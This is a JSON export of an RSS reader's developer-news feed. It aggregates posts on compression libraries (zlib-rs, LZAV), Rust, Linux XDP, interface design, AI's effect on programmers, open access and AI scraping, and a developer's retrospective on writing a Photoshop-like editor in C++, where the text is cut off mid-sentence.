{"id":"CSXkJZ3MdFx","title":"Dev News","displayTitle":"Dev News","url":"","feedLink":"","isQuery":true,"isEmpty":false,"isHidden":false,"itemCount":67,"items":[{"title":"Finding the Right Collaborator on GitHub","url":"https://medium.com/@miltonhyndrex/finding-the-right-collaborator-on-github-d174d021e202","date":1742156116,"author":"/u/Zestyclose-Poet9876","guid":761,"unread":true,"content":"<p>In the fast-paced world of software development, collaboration is key to bringing innovative ideas to life. Whether you’re an open-source enthusiast or working on a private project, finding the right collaborator can make a significant difference. In this blog post, we’ll explore strategies for finding the perfect collaborator on GitHub and introduce you to a handy tool l designed to streamline this process.</p><p>Collaboration offers numerous benefits:</p><ul><li>: Teaming up with others brings a variety of skills to the table.</li><li>: Sharing the workload helps in achieving milestones faster.</li><li>: Collaborating with others allows you to learn new techniques and best practices.</li><li>: Different perspectives can lead to more effective solutions.</li></ul><p>GitHub’s search functionality is a powerful tool for finding potential collaborators. You can search for users based on their repositories, contributions, and skills.</p><ul><li>: Find users who have worked on projects similar to yours.</li><li>: Look for users proficient in the programming languages your project requires.</li><li>: Use topic tags to discover repositories and contributors with specific interests.</li></ul><p>Be an active member of the GitHub community:</p><ul><li><strong>Participate in Discussions</strong>: Join conversations in issues and pull requests.</li><li><strong>Contribute to Open Source</strong>: Contributing to other projects can help you connect with like-minded developers.</li><li><strong>Attend Meetups and Events</strong>: GitHub hosts various events where you can meet potential collaborators.</li></ul><p>Platforms like Twitter, Reddit, and specialized forums can be great places to find collaborators. Share your project details and what you’re looking for in a collaborator.</p><p>Don’t underestimate the power of your existing network. Let your colleagues and friends know you’re looking for collaborators. They might know someone who fits the bill.</p><p>To simplify the process of finding the right collaborator, we developed the . This application leverages the GitHub API to help you find potential collaborators based on specific criteria.</p><ul><li>: Quickly find users by their GitHub username.</li><li>: Discover users based on their repositories, skills, or interests.</li><li>: Identify users who have contributed to specific repositories.</li><li>: Narrow down search results based on geographical location.</li><li>: View detailed profiles including repositories, contributions, and activity.</li></ul><p>Check it out on: <a href=\"https://collaborator-finder-tool.onrender.com/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://collaborator-finder-tool.onrender.com/</a></p><p>By using this tool, you can easily find collaborators who match your project’s needs and get detailed information about their GitHub activity. If you want in on the action you can find this project on GitHub.</p><p>Find Repo here: <a href=\"https://github.com/nia-cloud-official/collaborator-finder-tool/\" rel=\"noopener ugc nofollow\" target=\"_blank\">https://github.com/nia-cloud-official/collaborator-finder-tool/</a></p><p>Finding the right collaborator on GitHub can significantly enhance your project’s development process. By leveraging GitHub’s search features, engaging with the community, and utilizing tools like the Collaborator Finder Tool, you can connect with talented developers who share your vision.</p>","contentLength":2928,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jculpk/finding_the_right_collaborator_on_github/"},{"title":"LZAV 4.9: Increased decompression speed, resolved all msan issues, better platform detection. Fast In-Memory Data Compression Algorithm (inline C/C++) 460+MB/s compress, 2800+MB/s decompress, ratio% better than LZ4, Snappy, and Zstd@-1","url":"https://github.com/avaneev/lzav","date":1742154395,"author":"/u/avaneev","guid":762,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jctxqb/lzav_49_increased_decompression_speed_resolved/"},{"title":"Zlib-rs is faster than C","url":"https://trifectatech.org/blog/zlib-rs-is-faster-than-c/","date":1742153707,"author":"dochtman","guid":759,"unread":true,"content":"<p>We've released version <a href=\"https://crates.io/crates/libz-rs-sys\">0.4.2</a> of <a href=\"https://github.com/trifectatechfoundation/zlib-rs\">zlib-rs</a>, featuring a number of substantial performance improvements. We are now (to our knowledge) the fastest api-compatible zlib implementation for decompression, and beat the competition in the most important compression cases too.</p><p>We've built a <a href=\"https://trifectatechfoundation.github.io/zlib-rs-bench/\">dashboard</a> that shows the performance of the current main branch compared to other implementations, and tracks our performance over time to catch any regressions and visualize our progress.</p><p>This post compares zlib-rs to the latest <a href=\"https://github.com/zlib-ng/zlib-ng\">zlib-ng</a> and, for decompression, also to <a href=\"https://chromium.googlesource.com/chromium/src/third_party/zlib/\">zlib-chromium</a>. These are the leading C zlib implementations that focus on performance. We'll soon write a blog post with more technical details, and only cover the most impactful changes briefly.</p><p><a href=\"https://trifectatech.org/blog/current-zlib-rs-performance/\">Last time</a>, we benchmarked using the  flag. That gave the best results for our implementation, but was not entirely fair because our rust implementation could assume that certain SIMD capabilities would be available, while zlib-ng had to check for them at runtime.</p><p>We have now made some changes so that we can efficiently select the most optimal implementation at runtime too.</p><p>Picking the best version of a function is known as multiversioning. We have a baseline implementation that works on all CPUs, and then some number of specialized versions that use SIMD instructions or other features that may or may not be available on a particular CPU. The challenge is to always pick the optimal implementation, but with minimal runtime cost. That means we want to do the runtime check as few times as possible, and then perform a large chunk of work.</p><p>Today, multiversioning is not natively supported in rust. There are <a href=\"https://rust-lang.github.io/rust-project-goals/2025h1/simd-multiversioning.html\">proposals for adding it</a> (which we're very excited about!), but for now, we have to implement it manually which unfortunately involves some unsafe code. We'll write more about this soon (for the impatient, the relevant code is <a href=\"https://github.com/trifectatechfoundation/zlib-rs/blob/64d972982325626d8c8875e308846a53c7f0aa05/zlib-rs/src/inflate.rs#L1860-L1881\">here</a>).</p><p>The C code is able to use  implicit fallthroughs to generate very efficient code. Rust does not have an equivalent of this mechanism, and this really slowed us down when data comes in in small chunks.</p><p>Nikita Popov suggested we try the <code>-Cllvm-args=-enable-dfa-jump-thread</code> option, which recovers most of the performance here. It performs a kind of jump threading for deterministic finite automata, and our decompression logic matches this pattern.</p><p>LLVM does not currently enable this flag by default, but that is the plan eventually. We're also looking into supporting this optimization in rustc itself, and making it more fine-grained than just blindly applying it to a whole project and hoping for the best.</p><p>As far as we know, we're the fastest api-compatible zlib implementation today for decompression. Not only do we beat zlib-ng by a fair margin, we're also faster than the implementation used in chromium.</p><p>Like before, our benchmark is decompressing a compressed version of silesia-small.tar, feeding the state machine the input in power-of-2 sized chunks. Small chunk sizes simulate the streaming use case, larger chunk sizes model cases where the full input is availabe.</p><p>We're now significantly faster than zlib-ng for all but the smallest chunk size. A chunk size of  bytes is very unlikely to be relevant for performance in practice because the input can just be buffered and then decompressed in larger chunks.</p><p>We are however significantly faster than zlib-ng at the more relevant chunk sizes: well over 10% for inputs of 1kb, and over 6% for inputs of 65kb.</p><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table><p>For decompression, the zlib implementation used in the chromium project (found <a href=\"https://chromium.googlesource.com/chromium/src/third_party/zlib/\">here</a>, which we use via <a href=\"https://github.com/folkertdev/libz-chromium-sys\">a modified version of </a>) is often faster than zlib-ng. However, we also beat it at this benchmark for the most relevant chunk sizes.</p><p>Interestingly, zlib-chromium is mostly faster for the smaller chunk sizes, while for larger chunk sizes performance is fairly comparable to zlib-ng.</p><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table><p>We've been chipping away at compression too (shoutout to <a href=\"https://github.com/brian-pane\">Brian Pane</a>, who contributed numerous PRs in this area), but see more mixed results.</p><p>On x86_64 linux, we are faster for some of the compression levels that matter most, about 6% at the default level of 6, and over 10% at the \"best compression\" level 9. But we're still slightly slower for most of the other levels when comparing to zlib-ng.</p><table><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr></tbody></table><p>For most users, decompression is the most relevant operation, and even for compression we're a lot faster than stock zlib. Nevertheless, we'll continue to try and improve compression performance.</p><p>zlib-rs can be used both in C projects and as a rust crate in rust projects. For rust projects, we recommend using the  release of the <a href=\"https://crates.io/crates/flate2\">flate2</a> crate with the  feature flag. For use in C projects, zlib-rs can be built as a C dynamic library (see <a href=\"https://github.com/trifectatechfoundation/zlib-rs/tree/main/libz-rs-sys-cdylib\">instructions</a>) and used in any project that uses zlib today.</p><p>Our implementation is mostly done, and clearly performs extremely well. However, we're missing some <a href=\"https://github.com/trifectatechfoundation/zlib-rs/issues/49\">less commonly used API functions</a> related to gzip files that would make us a complete drop-in replacement in all cases.</p><p>To complete the work and improve performance and e.g. packaging, we're seeking funding for the amount of €95.000. See the <a href=\"https://trifectatech.org/initiatives/workplans/data-compression/#workplan-zlib-rs\">workplan</a> for details.</p><p>Please <a href=\"https://trifectatech.org/support\">contact us</a> if you are interested in financially supporting zlib-rs.</p>","contentLength":5160,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43381512"},{"title":"AI Is Making Developers Dumb","url":"https://eli.cx/blog/ai-is-making-developers-dumb","date":1742151118,"author":"chronicom","guid":746,"unread":true,"content":"<p>People often talk about the productivity gains that comes from LLMs, and it would be disingenuous of me to dismiss these. It’s true. You can be productive with an LLM-assisted workflow, but that same workflow could also be making you dumber.</p><p>There’s a reason behind why I say this. Over time, you develop a reliance on LLM tools. This is to the point where is starts to become hard for you to work without one.</p><p>I got into software engineering because I love building things and figuring out how stuff works. That means that I enjoy partaking in the laborious process of pressing buttons on my keyboard to form blocks of code.</p><p>LLM-assisted workflows take this away. Instead of the satisfaction of figuring out a problem by hand, one simply asks the LLM to take a guess.</p><p>Instead of understanding why things work in the way they do, you become dependent on an assistant to tell you what you should do.</p><p>Some people might not enjoy writing their own code. If that’s the case, as harsh as it may seem, I would say that they’re trying to work in a field that isn’t for them. Maybe you’re just here for the money? Fair enough. That happens with every profession, and it generally shows through one’s enthusiasm and demeanor.</p><p>The best engineers I’ve met are people who will spend hours at the weekend building their own version of a tool or software. Heck, that’s where you get innovation and advancements from. You can’t find performance improvements without a good understanding of how a system works, otherwise you’re just shooting in the dark.</p><p>There is a concept called “Copilot Lag”. It refers to a state where after each action, an engineer pauses, waiting for something to prompt them what to do next. There is no self-sufficiency, just the act of waiting for an AI to tell them what should come next. It’s akin to where a junior in the field might start - relying on their more senior colleagues to guide them and understand how to proceed.</p><p>Eons ago, I used to use GitHub Copilot in VS Code. When I look back on that time period now, I’m amazed I didn’t do more damage to knowledge retention.</p><p>Over time, I started to forget basic foundational elements of the languages I worked with. I started to forget parts of the syntax, how basic statements are used. It’s pretty embarrassing to look back and think about how I was eroding the knowledge I had gathered just because I wanted a short term speed increase.</p><p>That’s the reality of what happens when you use Copilot for a year. You start to forget things, because you are no longer having to think about what you’re doing in the same way that you would when you try to figure out how to solve a problem yourself.</p><p>It was actually a video by ThePrimeagen that made me realise this and confront reality. He had a clip from one of his streams where he was talking about Copilot lag. What a wake up call that was!</p><p>I stopped using LLM assistants for coding after that, and I’m glad I did.</p><p>To give an example, compilers are an area that I find super interesting. I had actually tried to work through Thorsten Ball’s <a href=\"https://interpreterbook.com\">Writing An Interpreter In Go</a> at the time. But it was completely pointless. Instead of learning about the topics and techniques in the book, Copilot was just outputting the code for me. Sure, it might feel cool that you just wrote a parser, but could you do it again if you turned Copilot off? Probably not. You also lose the chance to learn about concepts like memory management or data oriented design, because Copilot just gives you some code that it thinks might work, instead of you researching topics and understanding nuances.</p><p>That actually leads into another angle. Research. This time with a more positive spin on AI.</p><p>It’s true. LLMs are useful. They’re like a search engine. We used to use stack overflow to get help with a programming problem. Since LLMs are trained on all that data, they can be effective tools to learn more about a concept. But only if you use them with an inquisitive mindset and don’t trust their output.</p><p>As they’re notorious for making crap up because, well, that’s how LLMs work by design, it means that they’re probably making up nonsense half the time. It’s just about patterns and token sequences, not real statements by people that are insanely knowledgeable. It’s trained on content created by people who know what they’re talking about, but it regurgitates it in a manner that differs from the source material.</p><p>Anyway, interrogating responses and trying to figure out why it's recommending certain approaches is the only real way to get benefits from an LLM. Treat it like a conversation with someone, where you’re trying to understand why they like a certain technique. If you don’t understand why something is being suggested, or what it’s actually doing under the hood, then you have failed.</p><p>And make notes! Lots of them! I recently started playing around with Zig, and I constantly make notes on things that I am learning about the language, especially considering that it’s my first time dealing with memory management. They can be a useful reference point and handy when you’re stuck, or maybe even something to share with others!</p><p>I wrote this post on my morning commute, and my Tube has arrived at its destination, so I’ll leave it here.</p>","contentLength":5293,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43381215"},{"title":"The Ultimate Git Tutorial (Git 2.48)","url":"https://www.reddit.com/r/programming/comments/1jcslub/the_ultimate_git_tutorial_git_248/","date":1742151011,"author":"/u/jhcarl0814","guid":735,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Discovering the secrets of linux kernel","url":"https://github.com/Gliese832B/gdp","date":1742150091,"author":"/u/BisonUseful257","guid":734,"unread":true,"content":"<p>GDP is an attempt to create a simple network library via XDP.</p><p>XDP is a kernel-level packet processor that provides super fast features.</p><p>My method: I try to manipulate xdp by sending packet my own interface and then xdp will capture that. And I can receive packets in kernel level but I still did not add that to code.</p><p>Why did not i use AF_XDP?</p><p>eh I actually don't know. Even I am not sure about that I can use that. I just want to create my own method I do not care it is good or not. I would even be happy if someone learned about XDP because of me.</p><p>I will take care any suggestion.</p>","contentLength":578,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcs8kc/discovering_the_secrets_of_linux_kernel/"},{"title":"Simulating a quantum computer in 200 lines of code","url":"https://gist.github.com/vtereshkov/b2e404cd94dc431c0b3b027c622361c7","date":1742150071,"author":"/u/vtereshkov","guid":748,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1jcs89r/simulating_a_quantum_computer_in_200_lines_of_code/"},{"title":"Our Interfaces Have Lost Their Senses","url":"https://wattenberger.com/thoughts/our-interfaces-have-lost-their-senses","date":1742148671,"author":"me_smith","guid":745,"unread":true,"content":"<a href=\"https://wattenberger.com/\"></a><p>Think about how you experience the world—</p><p>you touch, you hear, you move.</p><div>An interface is the bridge between\n\t</div><p>Computers used to be physical beasts.</p><p>We programmed them by punching cards, plugging in wires, and flipping switches. Programmers walked among banks of switches and cables, physically choreographing their logic. Being on a computer used to be a full-body experience.\n</p><p>We've been successfully removing all friction from our apps — think about how effortless it is to scroll\n\tthrough a social feed. But is that what we want? Compare the feeling of doomscrolling to kneading\n\tdough, playing an instrument, sketching... these take effort, but they're also deeply\n\tsatisfying. When you strip away too much friction, meaning and satisfaction go with it.\n</p><p>Think about how you use physical tools. Drawing isn't just moving your hand—it's the\n\tfeel of the pencil against paper, the tiny adjustments of pressure, the sound of graphite\n\tscratching. You shift your body to reach the other side of the canvas. You erase with your other\n\thand. You step back to see the whole picture.\n</p><p>We made painting feel like typing,</p><h2>Putting the you back in UI</h2><p>So how might our interfaces look if we shaped them to fit us?\n</p><p>We use our hands to sculpt, our eyes to scan, our ears to catch patterns.\n\t</p><p>Our computers can communicate to us in many different formats, each with their own strengths:</p><div><p>And what about the reverse! We can communicate to our computers in many different ways, each with their own strengths:\n</p></div><p>And the real magic happens when we combine different modalities. You can't read and listen and speak\n\tat the same time—try reading this excerpt while talking about your day:\n</p><div><p>If it had not rained on a certain May morning Valancy Stirling’s whole life would have been\n\t\tentirely different. She would have gone, with the rest of her clan, to Aunt Wellington’s\n\t\tengagement picnic and Dr. Trent would have gone to Montreal. But it did rain and you shall hear\n\t\twhat happened to her because of it.\n\t</p></div><p>Let's build interfaces that let us multitask across senses.</p><p>So, what might a richer interface look like? I have strong conviction that our future interfaces should:\n</p><ul><li>let us collaborate on , not just ephemeral chat logs.</li><li>support <strong>multiple concurrent modalities</strong>—voice, gestures,\n\t\tvisuals, spatial components.\n\t</li><li>respond to —detecting context, organizing information, helping\n\t\tus think better.\n\t</li></ul><p>Last year, I did a rough exploration of what this could look like for a thought organizing tool. One that listened as you talked or typed, and organized your rambling thoughts into cards.\n</p><p>This interface is very rough, but felt like a different way of working with technology. Especially how it let me bumble through rough ideas one second, then responded to commands like \"re-group my cards\" or \"add 3 cards about this\" the next.\n</p><p>I would love to see more explorations like this!\n</p><h2>Our interfaces have lost their senses</h2><p>All day, we poke, swipe, and scroll through flat, silent\n\tscreens. But we're more than just eyes and a pointer finger. We think with our hands, our ears,\n\tour bodies.\n</p><p>The future of computing is being designed right now. Can we build something richer—something that\n\tmoves with us, speaks our language, and molds to our bodies?\n</p><img src=\"https://wattenberger.com/thoughts/our-interfaces-have-lost-their-senses/footer.png\">","contentLength":3226,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43380930"},{"title":"Complete idiot looking to transition to Rust from .NET and the Microsoft tech stack","url":"https://www.reddit.com/r/rust/comments/1jcqzml/complete_idiot_looking_to_transition_to_rust_from/","date":1742146851,"author":"/u/Big-Boy-Turnip","guid":755,"unread":true,"content":"<p>I've committed to starting new projects in Rust and, over time, rewriting existing code as well. So far, I'm getting somewhat comfortable with porting C console apps to Rust and using Rust in Web apps wherever it makes sense.</p><p>That said, my bread and butter (as a self-employed software developer) is and always has been .NET and the Microsoft tech stack starting with C#. I make desktop apps and even in 2025 still target Windows 7 (for some projects).</p><p>My clients are sometimes small government agencies, sometimes hobbyists looking to revive old equipment, and everything and everyone in between. I've written code for Windows drivers and I have a strong sense for that.</p><p>I believe that Rust enables me to write better code. I'm getting to grips with new terminology and the greater Rust ecosystem, from packages and crates to handling parallelism. What I'm missing are more examples and resources.</p><p>Where would I start transitioning my .NET desktop app development towards a Rust base? I don't need the code to produce native GUI elements, but I've yet to find a proper UI library for Windows that's built on Rust. Is this something I should pursue?</p><p>Furthermore, it looks like there are very few Rust developers who are also mainly Windows developers, so I get the feeling I'm in a minority inside of a minority and that's OK. I'd just like to hear about others' experiences working in this space!</p><p>Does Rust make sense, in your opinion, for what I'm seeking or should I give up and keep writing in C#, C/C++, and .NET? Thank you!</p>","contentLength":1523,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"One giant Kubernetes cluster for everything","url":"https://blog.frankel.ch/one-giant-kubernetes-cluster/","date":1742146623,"author":"/u/nfrankel","guid":764,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/kubernetes/comments/1jcqwhg/one_giant_kubernetes_cluster_for_everything/"},{"title":"\"Wait, not like that\": Free and open access in the age of generative AI","url":"https://www.citationneeded.news/free-and-open-access-in-the-age-of-generative-ai/","date":1742145813,"author":"thinkingemote","guid":758,"unread":true,"content":"<div data-nosnippet=\"\">Listen to me read this post here (not an AI-generated voice!), <a href=\"https://www.citationneeded.news/podcast/\">subscribe</a> to the feed in your podcast app, or <a href=\"https://www.citationneeded.news/content/media/2025/03/2025-03-14-Wait-not-like-that.mp3\">download</a> the recording for later.</div><p>The visions of the open access movement have inspired countless people to contribute their work to the commons: a world where “every single human being can freely share in the sum of all knowledge” (Wikimedia), and where “education, culture, and science are equitably shared as a means to benefit humanity” (Creative Commons).</p><p>But there are scenarios that can introduce doubt for those who contribute to free and open projects like the Wikimedia projects, or who independently release their own works under free licenses. I call these “wait, no, not like that” moments.</p><p>When a passionate Wikipedian discovers their carefully researched article has been packaged into an e-book and sold on Amazon for someone else’s profit? .</p><p>When a developer of an open source software project sees a multi-billion dollar tech company rely on their work without contributing anything back? </p><p>When a nature photographer discovers their freely licensed wildlife photo was used in an NFT collection minted on an environmentally destructive blockchain? .</p><p>And perhaps most recently, when a person who publishes their work under a free license discovers that work has been used by tech mega-giants to train extractive, exploitative large language models? </p><p>These reactions are understandable. When we freely license our work, we do so in service of those goals: free and open access to knowledge and education. But when trillion dollar companies exploit that openness while giving nothing back, or when our work enables harmful or exploitative uses, it can feel like we've been naïve. The natural response is to try to regain control.</p><p>This is where many creators find themselves today, particularly in response to AI training. But the solutions they're reaching for — more restrictive licenses, paywalls, or not publishing at all — risk destroying the very commons they originally set out to build.</p><div><div> is an independent publication, entirely supported by readers like you. Consider <a href=\"https://www.citationneeded.news/signup\">signing up</a> for a free or pay-what-you-want subscription — it really helps me to keep doing this work.</div></div><p>The first impulse is often to try to tighten the licensing, maybe by switching away to something like the <a href=\"https://en.wikipedia.org/wiki/Creative_Commons_NonCommercial_license\" target=\"_blank\" rel=\"noopener noreferrer nofollow\">Creative Commons’ non-commercial</a> (and thus, non-free) license. When NFTs enjoyed a moment of popularity in the early 2020s, some artists looked to Creative Commons in hopes that they might declare NFTs fundamentally incompatible with their free licenses (they didn’t). The same thing happened again with the explosion of generative AI companies training models on CC-licensed works, and some were disappointed to see the group take the stance that, not only do CC licenses not prohibit AI training wholesale, AI training should be considered non-infringing by default from a copyright perspective.</p><p>But the trouble with trying to continually narrow the definitions of “free” is that it is impossible to write a license that will perfectly prohibit each possibility that makes a person go “wait, no, not like that” while retaining the benefits of free and open access. If that is truly what a creator wants, then they are likely better served by a traditional, all rights reserved model in which any prospective reuser must individually negotiate terms with them; but this undermines the purpose of free, and restricts permitted reuse only to those with the time, means, and bargaining power to negotiate on a case by case basis.</p><p>Particularly with AI, there’s also no indication that tightening the license even . We already know that major AI companies have been training their models on all rights reserved works in their ongoing efforts to ingest as much data as possible. Such training may prove to have been permissible in US courts under fair use, and it’s probably best that it does.</p><p>There’s also been an impulse by creators concerned about AI to dramatically limit how people can access their work. Some artists have decided it’s simply not worthwhile to maintain an online gallery of their work when that makes it easily accessible for AI training. Many have implemented restrictive content gates — paywalls, registration-walls, “are you a human”-walls, and similar — to try to fend off scrapers. This too closes off the commons, making it more challenging or expensive for those “every single human beings” described in open access manifestos to access the material that was originally intended to be common goods.</p><p>Often by trying to wall off those considered to be bad actors, people wall off the very people they intended to give access to. People who gate their work behind paywalls likely didn’t set out to create works that only the wealthy could access. People who implement registration walls probably didn’t intend for their work to only be available to those willing to put up with the risk of incessant email spam after they relinquish their personal information. People who try to stave off bots with CAPTCHAs asking “are you a human?” probably didn’t mean to limit their material only to abled people who are willing to abide ever more protracted and irritating riddles. And people using any of these strategies likely didn’t want people to struggle to even find their work in the first place after the paywalls and regwalls and anti-bot mechanisms thwarted search engine indexers or social media previews.</p><p>And frankly, if we want to create a world in which every single human being can freely share in the sum of all knowledge, and where education, culture, and science are equitably shared as a means to benefit humanity, we should stop attempting to erect these walls. If a kid learns that carbon dioxide traps heat in Earth's atmosphere or how to calculate compound interest thanks to an editor’s work on a Wikipedia article, does it really matter if they learned it via ChatGPT or by asking Siri or from opening a browser and visiting Wikipedia.org?</p><p><strong>Instead of worrying about “wait, not like that”, I think we need to reframe the conversation to “wait, not  like that” or “wait, not in ways that threaten open access itself”.</strong> The true threat from AI models training on open access material is not that more people may access knowledge thanks to new modalities. It’s that those models may stifle Wikipedia and other free knowledge repositories, benefiting from the labor, money, and care that goes into supporting them while also bleeding them dry. It’s that trillion dollar companies become the sole arbiters of access to knowledge after subsuming the painstaking work of those who made knowledge free to all, killing those projects in the process.</p><p>Irresponsible AI companies are already imposing huge loads on Wikimedia infrastructure, which is costly both from a pure bandwidth perspective, but also because it requires dedicated engineers to maintain and improve systems to handle the massive automated traffic. And AI&nbsp;companies that do not attribute their responses or otherwise provide any pointers back to Wikipedia prevent users from knowing where that material came from, and do not encourage those users to go visit Wikipedia, where they might then sign up as an editor, or donate after seeing a request for support. (This is most AI companies, by the way. Many AI “visionaries” seem perfectly content to promise that artificial superintelligence is just around the corner, but claim that attribution is somehow a permanently unsolvable problem.)</p><p>And while I rely on Wikipedia as an example here, the same goes for any website containing freely licensed material, where scraping benefits AI companies at often extreme cost to the content hosts. This isn't just about strain on one individual project, it's about the systematic dismantling of the infrastructure that makes open knowledge possible.</p><p>Anyone at an AI company who stops to think for half a second should be able to recognize they have a vampiric relationship with the commons. While they rely on these repositories for their sustenance, their adversarial and disrespectful relationships with creators reduce the incentives for anyone to make their work publicly available going forward (freely licensed or otherwise). They drain resources from maintainers of those common repositories often without any compensation. They reduce the visibility of the original sources, leaving people unaware that they can or should contribute towards maintaining such valuable projects. AI companies should want a thriving open access ecosystem, ensuring that the models they trained on Wikipedia in 2020 can be continually expanded and updated. Even if AI companies don’t care about the benefit to the common good, it shouldn’t be hard for them to understand that by bleeding these projects dry, they are destroying their own food supply.</p><p>And yet many AI companies seem to give very little thought to this, seemingly looking only at the months in front of them rather than operating on years-long timescales. (Though perhaps anyone who has observed AI companies’ activities more generally will be unsurprised to see that they do not act as though they believe their businesses will be sustainable on the order of years.)</p><p>It would be very wise for these companies to immediately begin prioritizing the ongoing health of the commons, so that they do not wind up strangling their golden goose. It would also be very wise for the rest of us to not rely on AI companies to suddenly, miraculously come to their senses or develop a conscience en masse.</p><p>Instead, we must ensure that mechanisms are in place to  AI companies to engage with these repositories on their creators' terms.</p><p>There are ways to do it: models like Wikimedia Enterprise, which welcomes AI companies to use Wikimedia-hosted data, but requires them to do so using paid, high-volume pipes to ensure that they do not clog up the system for everyone else and to make them financially support the extra load they’re placing on the project’s infrastructure. Creative Commons is experimenting with the idea of “<a href=\"https://www.ietf.org/slides/slides-aicontrolws-creative-commons-position-paper-on-preference-signals-00.pdf\">preference signals</a>” — a non-copyright-based model by which to communicate to AI companies and other entities the terms on which they may or may not reuse CC licensed work. Everyday people need to be given the tools — both legal and technical — to enforce their own preferences around how their works are used.</p><p>Some might argue that if AI companies are already ignoring copyright and training on all-rights-reserved works, they'll simply ignore these mechanisms too. But there's a crucial difference: rather than relying on murky copyright claims or threatening to expand copyright in ways that would ultimately harm creators, we can establish clear legal frameworks around consent and compensation that build on existing labor and contract law. Just as unions have successfully negotiated terms of use, ethical engagement, and fair compensation in the past, collective bargaining can help establish enforceable agreements between AI companies, those freely licensing their works, and communities maintaining open knowledge repositories. These agreements would cover not just financial compensation for infrastructure costs, but also requirements around attribution, ethical use, and reinvestment in the commons.</p><p>The future of free and open access isn't about saying “wait, not like that” — it’s about saying \"yes, like that, but under fair terms”. With fair compensation for infrastructure costs. With attribution and avenues by which new people can discover and give back to the underlying commons. With deep respect for the communities that make the commons — and the tools that build off them —&nbsp;possible. Only then can we truly build that world where every single human being can freely share in the sum of all knowledge.</p><p>As I was writing this piece, I discovered that a SXSW panel featuring delegates from the Wikimedia Foundation and Creative Commons, titled “<a href=\"https://schedule.sxsw.com/2025/events/PP153044\">Openness Under Pressure: Navigating the Future of Open Access</a>”, discussed some of the same topics. (I was, sadly, scheduled to speak at the same time and so was unable to attend in person). The audio recording is available online, and I would highly recommend giving it a listen if this is a topic that interests you!</p>","contentLength":12336,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://news.ycombinator.com/item?id=43380617"},{"title":"LACT v0.7.2 released with RDNA4 support, Nvidia locked clocks and ROP count reporting","url":"https://github.com/ilya-zlobintsev/LACT/releases/tag/v0.7.2","date":1742145736,"author":"/u/Interject_","guid":766,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/linux/comments/1jcqk0s/lact_v072_released_with_rdna4_support_nvidia/"},{"title":"Dev Recreates Photoshop in C++","url":"https://f055.net/technology/that-time-i/that-time-i-recreated-photoshop-in-c/","date":1742144735,"author":"/u/HimothyJohnDoe","guid":725,"unread":true,"content":"<div><div><p>As I’m getting older I look back on all the things I’ve done as a creative developer, and I see so many cool projects! But I never wrote down any development stories, and most of these projects, even as successful when released, got lost in time as years go by. That’s why I’m starting my new posts series „That time I” where I look back on my most interesting projects.</p></div></div><p>The first one is about that time I recreated Photoshop in C++ and Windows API! I invite you to read my story and leave a comment with feedback, it’s hard to go on without your input 🙂</p><p>Everything started in early summer of 2006. I was reading *a lot* of manga back then. But all the image reading apps sucked. Specifically, none of the apps allowed me to control my reading using just the mouse, and reaching my keyboard all the time was distracting. Since I just finished the C++/Windows API course at the uni, I spent the summer break coding my perfect manga reader. And I named it <a href=\"https://github.com/f055/fiew-image-viewer\" target=\"_blank\" rel=\"noopener\">Fiew</a>.</p><p>Early autumn 2006 we returned to uni and had to decide on our final thesis for the degree. Writing the image viewer went smooth enough that I got the idea I could create an image editor as well. I was a heavy Adobe Photoshop user back then, so that became my goal. I mean, how hard can it be? Turns out, very.</p><p>Over the course of the next several months, I wrote Advanced Image Editor named Fedit in C++ using Windows API and GDI+ graphic libraries. It followed a set of five rules to benefit the end user: no installers, no archives, no registry keys, no additional runtimes and a single executable file. The result was a program that was ready to work without the need of installation, could be run on systems with limited privileges (or straight from a thumb drive) and consumed small amounts of resources.</p><p>I was very careful to make the interface look like classic Photoshop, and include all my most used features. So you had all the free floating windows with tools. The excellent colour picker. Easy layer management. Step-by-step reversible history. Several image filters, plus a matrix interface to encode your own pixel shifting filters too.</p><p>Straight from my previous project named Fiew I added a massive image library viewer. It really could quickly and easily scroll through massive amounts of pictures.</p><p>I had a lot of fun coding Fedit. And a lot of issues along the way. I spent a ton of time on MSDN and Stack Overflow, however that didn’t help that much since most of the issues were so specific I had to analyse and debug them on my own. But I worked like crazy on it, my motivation was immense. I had to make the bachelor thesis deadline, so for the final two-month stint I worked 14 hours a day.</p><p>User interface was the most tricky bit. I wanted the workflow to resemble Photoshop as much as possible. The freely snapping-unsnapping of the tool settings pane was particularly hard. But no less than recreating the colour picker or the tool selector.</p><p>By the time I finished I was pretty exhausted and kind of resenting WinAPI. But the thesis was a success and I received my Bachelor of Science in Engineering from the Warsaw University of Technology. Fedit received several positive reviews online but I didn’t promote it. Instead I took a well deserved holiday. A few months later thanks to the impression Fiew and Fedit made on the CTO of GoldenLine (Polish LinkedIn, market leader in its time, but now defunct), I landed a C++ job with a task to create extremely efficient WinAPI app to handle massive image uploading for a clone of 